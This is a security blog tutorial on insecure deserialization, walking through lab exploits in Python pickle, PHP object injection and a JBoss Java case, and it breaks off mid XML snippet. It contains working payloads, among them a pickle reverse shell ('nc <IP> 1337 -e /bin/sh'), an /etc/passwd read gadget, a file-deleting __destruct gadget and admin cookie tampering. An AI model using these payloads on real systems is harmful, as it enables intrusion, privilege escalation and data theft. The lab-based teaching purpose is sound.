---
title: Deserializing the Deserialization attack
author: nirajkharel
date: 2023-03-18 20:55:00 +0800
categories: [Web Pentesting, Deserialization]
tags: [Web Pentesting, Deserialization]
---

I was solving one of the active box in HTB where I encountered some interesting Deserialization vulnerability. Although I managed to solve the box, I was more curious about the exploitation of deserialization vulnerability in different languages. Therefore this blog contains the walkthrough for deserialization attacks on Java, PHP, Python and Node.


Before jumping into the attacks, lets first clear the concept of serialization and deserialization.

## Serialization
It is a process of transforming a data object into the series of bytes. This is done while transmitting the data over the network or for storing it since the object's state can be retained and also the storage requirement can be reduced making it more efficient to transmit over the network. We are talking about the same objects we listen on OOP programming. Example, if a car is a class than object is a class instance that allows us to use variables and methods from inside the class. A car can have different properties like model name, color, engine size and so on and each time you want to add a new car in your code, you create a car object using the properties defiend like model name, color, engine size and so on.


Let's create a car object here.
```python
python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> class Car:
...     def __init__(self, modelname, color, enginesize):
...         self.modelname = modelname
...         self.color = color
...         self.enginesize = enginesize
... 
>>> my_car = Car("Toyota Corolla", "red", "2.0L")
>>> 
>>> print(my_car.modelname)
Toyota Corolla
>>> 

```

We can serialize the object in python with pickle module.
```python
python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> class Car:
...     def __init__(self, modelname, color, enginesize):
...         self.modelname = modelname
...         self.color = color
...         self.enginesize = enginesize
... 
>>> my_car = Car("Toyota Corolla", "red", "2.0L")
>>> 
>>> import pickle
>>> with open('car.pickle','wb') as f:
...     pickle.dump(my_car,f)
```

When we serialize the object above, we can have the result like
```bash
strings car.pickle 
__main__
        modelname
Toyota Corolla
color
enginesize
2.0L

```

Let's take an another example using PHP
```php
<?php

class myCar
{
    private $modelname;
    private $color;
    private $enginesize;

    public function __construct(string $modelname, string $color, string $enginesize)
    {
        $this->modelname = $modelname;
        $this->color = $color;
        $this->enginesize = $enginesize;
    }

}

$car1 = new myCar('Toyota Corolla','red','2.0L');
$str1 = serialize($car1);

var_dump($str1);
```
Save it as mycar.php and execute the command `php mycar.php`. We can have a serialize data as
```php
php mycar.php
string(128) "O:5:"myCar":3:{s:16:"myCarmodelname";s:14:"Toyota Corolla";s:12:"myCarcolor";s:3:"red";s:17:"myCarenginesize";s:4:"2.0L";}"
```
Thefore different languages have different ways to serializing the data object.
But what does that syntax means?

![image](https://user-images.githubusercontent.com/47778874/226155960-70f956c0-f087-4f4c-b1dd-6c92d6da4b38.png)


## Deserialization
It is a process in programming that involves converting a serialized object or a stream of bytes back into an object that can be used within a program. This is the reverse process of serialization, and it enables the program to access and manipulate the original object.

Example, we have serialized the data and kept in a file called `car.pickle` using python. Now inorder to use the data stored on it, we need to deserialized.
```python
python3           
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pickle
>>> class Car:
...     def __init__(self, modelname, color, enginesize):
...         self.modelname = modelname
...         self.color = color
...         self.enginesize = enginesize
... 
>>> with open('car.pickle','rb') as f:
...     data1 = pickle.load(f)
... 
>>> data1.modelname
'Toyota Corolla'
>>> data1.color
'red'
>>> data1.enginesize
'2.0L'

```

There are various serialization formats available.

| **Platform Agnostic** 	| **Platform Specific** 	|
|-----------------------	|-----------------------	|
| [XML](https://learn.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer?view=net-7.0)                   	| [Python Pickle](https://docs.python.org/3/library/pickle.html)         	|
| [JSON](https://learn.microsoft.com/en-us/dotnet/api/system.text.json.jsonserializer?view=net-7.0)                  	| [PHP Serialize](https://www.php.net/manual/en/function.serialize.php)         	|
| [YAML](https://yaml.org/)                  	| [Java Serializable](https://www.javatpoint.com/serialization-in-java)    	|
| [TOML](https://github.com/status-im/nim-toml-serialization)                  	| [Ruby Marhsal](https://ruby-doc.org/core-2.6.3/Marshal.html)          	|
|                       	| [Node Serialize](https://www.npmjs.com/package/node-serialize)        	|

## What is Insecure Deserialization and how does it occur?
Insecure Deserialization also known as object injection is a vulnerability which occurs when user-supplied data in deserialized by an application. This can allow an attacker to manipulate or inject malicious code into the serialized object, and when it is deserialized into the application side, the malicious code submitted can change the angle of attack resulting the data exfiltration, remote code execution, authorization bypass and so on.

Exploiting this vulnerability is a not as easy as explained above. It requires a good understanding of programming languages and their object-oriented programming (OOP) concepts. Moreover, certain prerequisites should be in place in the vulnerable code for successful execution.

Let's take on example from Ippsec's [PHP Deserialization video.](https://www.youtube.com/watch?v=HaW15aMzBUM&t=321s)

**Server Code**<br>
Below is a simple PHP code which has a class called User and it has two attributes username and isAdmin. There is also a function which checks whether the user is an admin or not and prints the result accordingly. The code seems to accept the request using ippsec parameter in a serialized object format, it deserializes it and calls the function PrintData() using the deserialized object.

```php
<?php

class User
{
    public $username;
    public $isAdmin;

    public function PrintData(){
        if ($this->isAdmin){
            echo $this->username . " is an admin\n";
        }else{
          echo $this->username . " is not an admin\n";
        }
    }
}

$obj = unserialize($_POST['ippsec']);
$obj->PrintData();
```
Save the above code as `server.php`.

So how can we communicate with this piece of code? Let's create a PHP code which serializes our data and send it to the above application.
```php
<?php

class User
{
    public $username;
    public $isAdmin;
}

$obj = new User();
$obj->username = 'ippsec';
$obj->isAdmin = False;

echo serialize($obj);
```
Save the above code as `client.php`. The above code simply serializes the data that we need to submit into the server.

Run the basic PHP server command in the directory where server.php is located.
```bash
php -S 127.0.0.1 80
```

Run the client.php file to print the serialized data.
```bash
php client.php
O:4:"User":3:{s:8:"username";s:6:"ippsec";s:7:"isAdmin";N;s:7:"isAdmin";b:0;}
```
Now let's send the request to server.php file.
```bash
curl -XPOST -d 'ippsec=O:4:"User":3:{s:8:"username";s:6:"ippsec";s:7:"isAdmin";N;s:7:"isAdmin";b:0;}' 127.0.0.1:80/server.php
```
![image](https://user-images.githubusercontent.com/47778874/226165008-76df40d4-2f1e-4577-b51a-1afb932a0c4a.png)

Let's change the isAdmin value to True and send the request again. You need to edit the client.php file and change the value from False to True.
```bash
curl -XPOST -d 'ippsec=O:4:"User":3:{s:8:"username";s:6:"ippsec";s:7:"isAdmin";N;s:7:"isAdmin";b:1;}' 127.0.0.1:80/server.php
```
![image](https://user-images.githubusercontent.com/47778874/226165231-1c52b9f2-a381-4bd7-9d4b-e607b8780499.png)

Here we can see that the user can serialize the data and the application will proceed data submitted by a user. There is a possible chance that this code is vulnerable to insecure deserialization. But we can not just exploit it right away since there is no any dangerous functions implemented on here. We will learn more on **Arbitrary objects and Magic Methods** on below Lab Demonstrations sections.

## Lab Demonstration
Let's move to the practical lab walkthrough now. Yes, we are yet to start the practical lab.

**The lab was supposed to be based on the [NotSoCereal](https://github.com/NotSoSecure/NotSoCereal-Lab/blob/main/Resources/Deployment/deployment.md) but the virtual machine for the box has been removed. I will explore the machine once it is accessible.**

### Deserialization on Python: DES-Pickle
I have found another lab for python deserialiazation attack lab https://github.com/blabla1337/skf-labs/tree/master/python/DES-Pickle
- Clone the repository https://github.com/blabla1337/skf-labs.git
    ```bash
    git clone https://github.com/blabla1337/skf-labs.git
    ```
- Navigate to `skf-labs/python/Des-Pickle`
    ```bash
    cd skf-labs/python/Des-Pickle
    
    # Recommending to remove exploit.py file inorder to avoid the spoiler.
    
    # Install the requirements
    pip3 install -r requirements.txt
    
    # And run the python file.
    python3 DES-Pickle.py
    
    # Navigate to 127.0.0.1:5000 on a browser.
    ```
- Open the URL on the browser, we can see a simple web page with a input field. 
![image](https://user-images.githubusercontent.com/47778874/226404037-07535e7a-b665-4c1a-8113-fc5fbb16604a.png)

- Intercept the request on burp and send some random text. It looks like the application sends POST request to **/sync** and the body parameter is **data_obj**
![image](https://user-images.githubusercontent.com/47778874/226195588-b3c6f568-cdf0-4a50-adb8-de3decb0b5fe.png)

- Lets view the source code **DES-Pickle.py**<br>
```python
@app.route("/sync", methods=['POST'])
def deserialization():
        with open("pickle.hacker", "wb+") as file:
            att = request.form['data_obj']
            attack = bytes.fromhex(att)
            file.write(attack)
            file.close()
        with open('pickle.hacker', 'rb') as handle:
            a = pickle.load(handle)
            print(attack)
            return render_template("index.html", content = a)
```
- Viewing the source code we can find that when POST request is performed on **/sync** path, a method **deserialization()** is triggered. The method stores the value obtained from data_obj parameter and save it to **pickle.handler**. And then it deserializes the data from **picke.handler** file using pickle.load method and renders the output in an HTML file.
- The method called **reduce()** doesn't require any input and should provide a string or a tuple as its output. The resulting object is commonly known as the **reduce value.** If a tuple is returned, it must contain between two and six items, and optional items can be left out or replaced with None. The meaning of each item is as follows, in order:
    - A callable object that will be used to create the object's initial version.
    - A tuple of arguments to pass to the callable object. If the callable doesn't accept any arguments, an empty tuple must be provided.
   
- In order to exploit it, we need to create a serialize data. Pickle allows different objects to declare how they should be pickled using the **__reduce__** method. Whenever an object is pickled, the **__reduce__** method defined by it gets called. 
- In the below code we are just defining a class **test123** which contains the **__reduce__method**, it returns a callable object as **os.system()** and a tuple of arguments as **sleep 5**.<br>

```python
import os
import pickle

class test123():
	def __reduce__(self):
		return (os.system, ('sleep 5',))

data123 = pickle.dumps(test123())
print(data123)
```
- Running the code we can have
```bash
python3 deseee.py
b'\x80\x04\x95"\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x07sleep 5\x94\x85\x94R\x94.'
```
- Since the application DES-Pickle.py have bytes.fromhex() method implemented, we need to convert the above binary into hex. We can do it using binascii.hexlify(). It makes our final payload as

```python
import os
import pickle
import binascii

class test123():
	def __reduce__(self):
		return (os.system, ('sleep 5',))

data123 = pickle.dumps(test123())
print(binascii.hexlify(data123))
```
- Run the code again.
```bash
python3 descee.py
b'80049522000000000000008c05706f736978948c0673797374656d9493948c07736c656570203594859452942e'
```
- Copy only the value and submit the request again. Since we have told the application to sleep for 5 seconds, it will respond after 5 seconds indicating the command execution on it. 

![image](https://user-images.githubusercontent.com/47778874/226198194-da71f745-bbea-4e76-a9ac-935187a69c3e.png)

### Deserialization on Python: DES-Pickle-2
- Clone the same github repository as above.

```bash
git clone https://github.com/blabla1337/skf-labs.git
cd skf-labs/python/DES-Pickle-2
rm rev.py # To prevent spoiler

python3 Login.py
```
- Open the provided URL on a browser.
- The application seems to have a login and registration page.
- Let's directly jump into the source code. Open the `Login.py` file.
- Between line 26 and 34 we can see that the application has implemented python pickle module.

```python
@app.route("/login", methods=['GET', 'POST'])
def login():
    sqli  = Classes()
    if 'rememberme' in request.cookies:
        b64=request.cookies.get('rememberme')
        a = pickle.loads(base64.b64decode(b64))
        session['username'] = a.username
        session['loggedin'] = True
        return render_template("loggedin.html")
```
- Here the code shows that whenever a **GET** or **POST** method is initiated on the **/login** endpoint, the **login()** method is triggered. The parameter **rememberme** is expected on the cookies and after decompiling the cookies with base64 decode, it is passed into the **pickle.load()** method. 
- Let's create a python script.

```python
import pickle
import base64
import os

class payloads(object):
def __reduce__(self):
    return (os.system,("sleep 5",))

print(base64.b64encode(pickle.dumps(payloads())))
```
- Here we defined a class and created a **__reduce__** method which returns the tuple value. The object is dumped using pickle.dumps, encoded with base64 encoder and printed.

```bash
python3 exploit.py
b'ASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCA1lIWUUpQu'
```
- Open the application and register a new user.
- Enter username and password and login.
- Intercept the request in burp as well.
- After login, refresh the page and intercept it with burp.
- Replace the **rememberme** parameter value with **ASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCA1lIWUUpQu**<br>
- Check if the application responds after 5 seconds. If yes, the exploit is possible.
- Listen to traffic using netcat

```bash
nc -lvnp 1337
```
- Create a script **exploit.py** again and insert the reverse shell payload as below.

```python
import pickle
import base64
import os

class payloads(object):
def __reduce__(self):
    return (os.system,("nc <IP> 1337 -e /bin/sh",)) # replace <IP> 

print(base64.b64encode(pickle.dumps(payloads())))
```
- Run the script
```bash
python3 exploit.py
b'gASVOgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB9uYyAxOTIuMTY4LjEuNjQgMTMzNyAtZSAvYmluL3NolIWUUpQu'
```
- Replace the **rememberme** parameter value with **gASVOgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB9uYyAxOTIuMTY4LjEuNjQgMTMzNyAtZSAvYmluL3NolIWUUpQu**<br>
![image](https://user-images.githubusercontent.com/47778874/226403615-1d7cc995-3faa-44e1-830e-f9185b4c0882.png)
- A reverse shell can be received.
![image](https://user-images.githubusercontent.com/47778874/226403735-afca20b3-1e38-4562-b5f7-af66b2aefdf9.png)

**Learn about Python Deserialization Attack more on:** https://davidhamann.de/2020/04/05/exploiting-python-pickle/ 

### Deserialization on PHP
PHP performs serialization and deserialization with the native methods **serialize()** and **unserialize()**. Insecure Deserialization occurs when the user supplied data is deserialized by an application. These are generally done through cookie session, **POST/GET** variables on the web requests and web sockets as well.

Let's go along with the Lab. We will use the lab from [PortSwigger](https://portswigger.net/web-security/deserialization/exploiting)

**Serialized Objects Manipulation**<br>	
The serialized object holds various attributes that define the task to be executed upon deserialization. For instance, in applications that use PHP session cookies, these cookies can be serialized objects that identify the user who logged in and their associated privileges. If someone alters the attribute values of the serialized object, the application will execute the modified values upon deserialization. Let's explore it on the Lab.
- Navigate to the lab: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects
- Click on Access the Lab, you might need to login into the lab using your valid credentials.
![image](https://user-images.githubusercontent.com/47778874/227130095-c80439df-4c25-41f9-9e16-ee8c2ed1fbcd.png)
- A simple shopping application is show, navigate into the login section and enter the credentials `wiener:peter`
![image](https://user-images.githubusercontent.com/47778874/227140886-3a31c504-b9f4-4edb-b599-78f70d9d888a.png)
- Intercept the request in burpsuite.
![image](https://user-images.githubusercontent.com/47778874/227141421-b8cb7d80-45f9-4567-a7e5-429799da8e6d.png)
- We can see the session cookie on the request header. Let's decode the cookies to view the serialized data. You can do it via base64 decoder in burpsuite.
![image](https://user-images.githubusercontent.com/47778874/227141870-9b2e7da2-1219-411c-aa7a-e324575ba00d.png)
- The serialized object is as follow:
```bash
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```
- Change the boolean value of attribute `admin` to 1. Base64 encode it.!
![image](https://user-images.githubusercontent.com/47778874/227142983-9e12c310-7a0c-46a7-bd65-94f5bd64df5a.png)
- Navigate to account section and then intercept the request again, then replace the cookie value, we can see the admin panel on it.
![image](https://user-images.githubusercontent.com/47778874/227142873-32ca3b99-5752-4b6b-b112-66987f7f1fde.png)
- Click on Admin Panel section, we can see that the user have an admin privilege now.
![image](https://user-images.githubusercontent.com/47778874/227143207-6b478c9f-9d1f-4004-a35b-685ee8d45bf3.png)
- Click on Delete for Carlos user, intercept the request and replace the cookie value, the lab will be solved.
- In this way, an attacker can manipulate the attributes on the serialized data to modify the workflow of an application.


**PHP Data Types and Comparisons Manipulation** <br>		
PHP Data Types and their comparisons are slightly different than other programming languages. PHP has a loose comparisons regarding data types which means, when commparing between string `"10"` and an integer `10` if the comparison operator is `==`, then it will return True. To compare the data types as well, the comparison operator should be `===` which will return False.

Also, while there is a comparison between an integer `10` and a alphanumeric characters `10 is what it is` then, PHP will check if the alphanumeric character starts with the numeric value or not, if it does, it will ignore the rest of the string and will only compare the numeric value. So the PHP will interpret `10 == "10 is what it is"` into `10 = "10"`.

Also, if above alphanumeric characters does not contains any numbers than it will convert it into `0` since it has 0 numbers in int. 

Let's jump into the lab. You can find the lab from [Portswigger here](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types).
- Login into the portswigger account and click on Access the lab as shown below.
![image](https://user-images.githubusercontent.com/47778874/227147374-0923f430-a5d9-4e49-b1fd-634755ae71c4.png)
- Navigate to My Account section, enter provided login details `wiener:peter`.
- If we view the HTTP request, we can find the session cookie
![image](https://user-images.githubusercontent.com/47778874/227150947-e36bae44-7978-455f-b177-7e09f1d19a9a.png)
- Decode it using any Base64 decoder.
![image](https://user-images.githubusercontent.com/47778874/227151215-8bd971ba-72d8-46b3-b0f9-8950d7554936.png)
- The serialized object would be
```bash
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"cinv7qvszrn92offfla5szz0sp1bf0e5";}
```
- We need to replace the `username` value from `wiener` to `administrator` since the objective is to login as administrator user which makes our serialized object as,
```bash
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";s:32:"cinv7qvszrn92offfla5szz0sp1bf0e5";}
```
- Note that the length of string will be changed since `administrator` has 13 characters.
- As we discussed above, if the comparison operator `==` is used and if we compare between any `strings` and `0`, it will return `True` because `0` means there is no numeric characters and the comparison between any string characters and no numeric characters will return True on PHP. Thefore our final serialized object would be.
```bash
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```
- Note that the `access_token` needs to be an integer, and for integer value there would not be the length.
- Encode it with Base64 encoder
![image](https://user-images.githubusercontent.com/47778874/227176183-787f96c0-bbde-4f97-aec5-d33d64f88a67.png)
- Click on My Account section, intercept the request and replace the session token.
- There would be an `Admin Panel` added on the navigation bar.
- Click on `Admin Panel` and replace the session again.
![image](https://user-images.githubusercontent.com/47778874/227177854-189e57f2-329e-48bc-b63c-18e04255502b.png)
- Click on delete for Carlos user and replace the session again.
- The user Carlos will be deleted and a lab will be solved.

**Arbitrary objects and Magic Methods**<br>
Magic methods are the reserved methods and aimed to perform certial tasks on PHP. This generally consists `__methodname()` as a syntax and are called automatically when particular conditions are met.	It is used to predetermine that which part or what code is to be executed when the corresponding events occurs. 

Magic methods generally does not contains vulnerabilities on it's own, but if the user supplied data is configured to execute such methods, an attacker can invoke such methods with a malicious payload to override the workflow of the code. Let's focus on some important magic methods that we need to understand.<br>
- **__construct**
   - The magic method `__construct()` will be triggered and the code inside it will run as soon as an object of the class is instantiated. 
- **__destruct()**
   - The `__destruct()` method is called automatically for each object of the class at the end.
- **__wakeup()**
   - It will be called as soon as a serialized object of the class is deserialized.
- **__toString()**
   - It will be called when an object of a class is treated as a string. Example, if `echo $obj` is performed, the `__toString()` method is called automatically.<br>
You can learn more about [PHP Magic Methods here.](https://www.geeksforgeeks.org/what-are-magic-methods-and-how-to-use-them-in-php/)

Suppose the application also contains a class to read the file content from the provided filename. To do such, it can have some magic methods availble like **__tostring()**.This makes our server.php code as below:
```php
<?php
class ReadFile
{
      public function __tostring()
      {
          return file_get_contents($this->filename);
      }
}
class User
{
    public $username;
    public $isAdmin;

    public function PrintData(){
        if ($this->isAdmin){
            echo $this->username . " is an admin\n";
        }else{
          echo $this->username . " is not an admin\n";
        }
    }
}
$obj = unserialize($_POST['ippsec']);
$obj->PrintData();
?>
```
So using the deserialization vulnerability, we can jump into the **__tostring()** method of ReadFile class since it is defined there. Let's create our client.php file now.
```php
<?php

class ReadFile{
    public function __construct()
    {
        $this->filename = '/etc/passwd';
    }
}
class User
{
    public function __construct()
    {
        $this->username = new ReadFile();
        $this->isAdmin = True;
    }
}
$obj = new User();
echo serialize($obj);
?>
```
**So, what does this code actually do?**<br>
The code has two classes ReadFile and User. The ReadFile file class sets `/etc/passwd` on a variable filename under **__construct()** method which is a constructor. The User object is reconstructed and the **__construct()** method of the ReadFile class is called, which sets the filename property to **/etc/passwd**. This means that the ReadFile object assigned to the username property now contains a reference to the **/etc/passwd** file.

So, when we serialize the above code, it contains information about the "User" object and its properties, including the "ReadFile" object assigned to the "username" property. As a result, when the serialized object is tranmitted on the server.php file, it deserializes it and the object is injected, which means since ReadFile class is defined on the server.php file due to the **__tostring()** method the ReadFile class will be triggerred and `/etc/passwd` file will be passed on the parameter **filename** which will return the content of the file.

Create a malicious serialized object with above code.
```bash
bash client.php

O:4:"User":2:{s:8:"username";O:8:"ReadFile":1:{s:8:"filename";s:11:"/etc/passwd";}s:7:"isAdmin";b:1;}
```

Now again host the server.php and execute the payload.
```bash
php -S 127.0.0.1:80

curl -XPOST -d 'ippsec=O:4:"User":2:{s:8:"username";O:8:"ReadFile":1:{s:8:"filename";s:11:"/etc/passwd";}s:7:"isAdmin";b:1;}' 127.0.0.1/server.php
```
![image](https://user-images.githubusercontent.com/47778874/226169753-325de553-5a63-4582-861d-185de72f8f4b.png)

Let's explore this on [PortSwigger Lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php) as well.

![image](https://user-images.githubusercontent.com/47778874/227760270-2b320ccb-4338-402f-a947-0f4da3d8638b.png)
- The goal is to delete a text file called **morale.txt** from Carlo's home directory. Also we need to view the source code to solve this lab.
- Navigate to My Account section, enter provided login details `wiener:peter`.
- View the source code of the application with `Ctrl+U`. We can see a commented section where contains `/libs/CustomTemplate.php`
- Since we need to read the source code inorder to exploit the vulnerability in this lab, this PHP file might contain some useful information.
- Open it on the repeater. The response does not contain any code.
![image](https://user-images.githubusercontent.com/47778874/227761091-9a7dd2b7-d5f2-498f-8042-50dc7da73eb3.png)
- Append `~` on the file and send the request again.
![image](https://user-images.githubusercontent.com/47778874/227761124-775196c7-d001-464b-9707-afb54d004c5f.png)
- We can find the source code, let's download the source code and analyze it to find the vulnerability.

```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }
    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }
    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }
    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }
    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}
?>
```

- In the above code, we can see that it contains a **__destruct()** method which will be triggered at the end of execution on this PHP file. The **__destruct()** method will check whether the file exists on the system and using the **unlink()** method it will delete the file if it exist. The **unlink()** method on the PHP is used to delete the file.
- Let's create an exploit for this

```php
<?php

class CustomTemplate
{
    public function __construct()
    {
        $this->lock_file_path = '/home/carlos/morale.txt';
    }
}
$obj = new CustomTemplate();
echo serialize($obj);
?>
```
- Here the code contains a **CustomTemplate** class which has **__construct()** method and it will be executed every time the class CustomTemplate is instantiated. The construct method is used to initalize the property to the string parameter called **lock_file_path** and prints its serialized object.
- So in the server side, when the object is unserialized, the **__destruct()** method will be triggered and check for the existence of file passed on **lock_file_path** parameter and if it exist, it will delete the file.
- Run the code to create a serialized object.
```bash
bash exploit.php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```
- Encode it with Base64 encoder and replace it to the session cookie.
![image](https://user-images.githubusercontent.com/47778874/227762135-3fe689bb-10cf-4a70-bca3-6c8b0a1b4d00.png)
![image](https://user-images.githubusercontent.com/47778874/227762222-46fee191-33bf-4b8e-895c-03200cdf414b.png)
- The file will be deleted and the lab will be solved.
![image](https://user-images.githubusercontent.com/47778874/227762210-07492b3c-18b3-45d4-910f-1fe6f642dedb.png)

### Deserialization on Java
Serialization is performed under java in **java.io** package which includes
- **java.io.serializable**
- **java.io.Externalizable**
- **ObjectInputStream**
- **ObjectOutputStream**

**ObjectOutputStream Class**
- It is used to write object states to the file. An object that implements **java.io.Serializable** interface can be written to strams. It provides various methods to perform serialization.
- The **writeObject()** method of **ObjectOutputStream** class serializes an object and send it to the output stream
```java
public final void writeObject(object x) throws IOException
```

**ObjectInputStream Class**
- An ObjectInputStream deserializes objects and primitive data written using an ObjectOutputStream.
- The **readObject()** method of **ObjectInputStream** class references object out of stream and deserialize it.
```java
public final Object readObject() throws IOException,ClassNotFoundException
```
You can learn about [Java Serialization and Deserialization more here.](https://www.studytonight.com/java/serialization-and-deserialization.php)

For a lab demonstration, we will be exploiting the [Insecure Deserialization on JBoss 6.1.0 CVE-2015-7501](https://www.rapid7.com/db/vulnerabilities/red_hat-jboss_eap-cve-2015-7501/).
- To build the lab, we have to use the docker build. Save below configurations on a Dockerfile.

```bash
mkdir java-desc
cd java-desc
vim Dockerfile
```

```dockerfile
FROM jboss/base:latest
EXPOSE 8080

ENV SERVER_HOME /opt/jboss/server/
ENV JBOSS_HOME /opt/jboss/server/jboss-6.1.0.Final/

USER root

RUN mkdir $SERVER_HOME

RUN cd $SERVER_HOME \
    && curl -O https://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip \
    && unzip jboss-as-distribution-6.1.0.Final.zip \
    && curl -O https://download.java.net/openjdk/jdk7u75/ri/jdk_ri-7u75-b13-linux-x64-18_dec_2014.tar.gz \
    && tar xfz jdk_ri-7u75-b13-linux-x64-18_dec_2014.tar.gz \
    && rm jdk_ri-7u75-b13-linux-x64-18_dec_2014.tar.gz \
    && rm jboss-as-distribution-6.1.0.Final.zip

RUN echo "JAVA=/opt/jboss/server/java-se-7u75-ri/bin/java" >> /opt/jboss/server/jboss-6.1.0.Final/bin/run.conf


ENV LAUNCH_JBOSS_IN_BACKGROUND true

CMD ["/opt/jboss/server/jboss-6.1.0.Final/bin/run.sh", "-b", "0.0.0.0"]

```

- Start Docker Desktop or daemon.
- Build the docker.

```bash
docker build . -t jboss
```

- Run the docker image

```bash
docker run -p 8080:8080 jboss
```

- Navigating into **YOUR-IP:8080**, we can see the JBOSS web app displayed.
![image](https://user-images.githubusercontent.com/47778874/228146731-fa168878-be96-4f8f-9a2c-1a654e666bd3.png)
- Navigate to **YOUR-IP:8080/invoker/JMXInvokerServlet** and intercept the request with burp.
- You might need to change the listening port on burp.
- If we watch closely on the response, we can see the header **¬ísr$** which is Java Serialized data.
![image](https://user-images.githubusercontent.com/47778874/228147707-7edc0bd4-1da3-47fa-b13e-07329f00d4f4.png)
- If we decode that value using ASCII Hex value, we can get **aced0005** and if we see this value in any of Hex data, we can confirm that this is serialized object.
- ![image](https://user-images.githubusercontent.com/47778874/228148457-5ca87e47-159d-48cb-83c2-658cd27f07fd.png)
- Also, if we encode that HEX value with Base64 encoder we can have an encoded value **rO0ABXNyACQ=** which is also the Base64 representation of Java Serialized object.
- ![image](https://user-images.githubusercontent.com/47778874/228149533-d032a58e-669e-42d6-ae1c-03e092a77bd1.png)
- Until now, we cannot verify either the application contains insecure deserialization vulnerability, we can perform some hit and trial with [ysoserial](https://github.com/frohoff/ysoserial).
- Let's perform some source code analysis at first and find where and how this vulnerability existed. You can download the source code from [JBOSS Web Site](https://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final-src.zip)

```bash
wget https://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final-src.zip
unzip jboss-as-distribution-6.1.0.Final-src.zip
cd jboss-6.1.0.Final-src
```

- Open the code base on VS Code or any other applications.
- As discussed on the explanation about **readObject()** method of **ObjectInputStream** class, we need to find if that method is implemented since serialization is performed. Also, all the **readObject()** method on the source code might not be vulnerable. Since we knew that the vulnerability exists on **invoker/JMXInvokerServlet**, we can search for **readObject()** method using VS Code and include `*servlet` on the files to include.
![image](https://user-images.githubusercontent.com/47778874/228157852-1d8716a3-441e-487d-bf7b-71ae7c8fe99b.png)
- The Java file you should be looking on is `varia/src/main/java/org/jboss/invocation/http/servlet/InvokerServlet.java`
![image](https://user-images.githubusercontent.com/47778874/228160759-e93db96b-0993-4209-8e6c-6d0b3ab48642.png)
- If we see the above code between lines 116-138, we can find a **ois.readObject()** method, which comes from **ObjectInputStream** and it comes from **ServletInputStream** and that is created from **request.getInputStream()**. This **request** is passed as **HttpServletRequest** parameter in **processRequest()** method.
- We need to find where this **processRequest()** method is called within this Java file and we can find two methods **doGet** and **doPost** between line 219-233 where **processRequest()** is called. **doGet** and **doPost** are methods of the javax.servlet.http.HttpServlet class that are used to handle HTTP GET and POST requests, respectively. Therefore when we performed GET request on the **/invoker/JMXInvokerServlet** endpoint, we got some serialized object back.
- When we send some serialized object on above endpoint with POST request, it triggers the **doPost** method, the **doPost** method calls **processRequest** method and it will deserializes the object using below code which is executed when **processRequest** method is triggered.

```java
ServletInputStream sis = request.getInputStream();
ObjectInputStream ois = new ObjectInputStream(sis);
mi = (MarshalledInvocation) ois.readObject();
ois.close();
```

- Sometimes we do not get such endpoints easily, in such case we can find the endpoint from **web.xml**. Search your class name on web.xml file, we can find our class name on **<servlet-class>org.jboss.invocation.http.servlet.InvokerServlet</servlet-class>** and which is defined under **<servlet-name>JMXInvokerServlet</servlet-name>**.
```xml
   <servlet>
       <servlet-name>JMXInvokerServlet</servlet-name>
       <description>The JMXInvokerServlet receives posts containing serlized
       MarshalledInvocation objects that are routed to the invoker given by
       the the MBean whose object name hash is specified by the
       invocation.getObjectName() value. The return content is a serialized
       MarshalledValue containg the return value of the inovocation, or any
       exception that may have been thrown.
       </description>
       <servlet-class>org.jboss.invocation.http.servlet.InvokerServlet</servlet-class>
       <load-on-startup>1</load-on-startup>
   </servlet>
```
- And if we search the keyword **JMXInvokerServlet** on the same XML file, we can find the endpoint.

```xml
<servlet-mapping>
       <servlet-name>JMXInvokerServlet</servlet-name>
       <url-pattern>/JMXInvokerServlet/*</url-pattern>
</servlet-mapping>
```

- But this only provided **/JMXInvokerServlet/** but as we see above we also need **invoke/JMXInvokerServlet/**. If we navigated to **jboss-service.xml** which is on the same directory as **web.xml** and searched **JMXInvokerServlet** we can find the full URL endpoint as shown below.

```xml
<value-factory bean="ServiceBindingManager" method="getStringBinding">
   <parameter>jboss.web:service=WebServer</parameter>
   <parameter>HttpConnector</parameter>
